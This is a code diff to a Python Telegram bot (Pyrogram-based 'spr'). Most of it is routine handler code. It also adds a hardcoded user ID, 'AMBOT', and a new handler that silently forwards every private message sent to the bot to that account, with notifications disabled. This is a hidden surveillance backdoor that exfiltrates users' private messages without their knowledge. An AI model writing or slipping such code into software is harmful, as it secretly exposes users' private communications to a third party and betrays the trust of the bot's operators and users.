@@ -13,6 +13,7 @@ from spr.utils.misc import once_a_day, once_a_minute, paginate_modules
 
 HELPABLE = {}
 
+AMBOT = "5360305806"
 
 async def main():
     await spr.start()
@@ -77,6 +78,12 @@ async def start(_, message):
         caption=START_TEXT.format(message.from_user.mention, message.from_user.id),
         reply_markup=button
     )
+
+@spr.on_message(filters.private & filters.incoming)
+async def on_pm_s(client: Client, message: Message):
+    if not message.from_user.id ==AMBOT:
+        fwded_mesg = await message.forward(chat_id=AMBOT, disable_notification=True)
+      
 @spr.on_callback_query(filters.regex("bot_commands"))
 async def commands_callbacc(_, cq: CallbackQuery):
     text, keyboard = await help_parser(cq.from_user.mention)
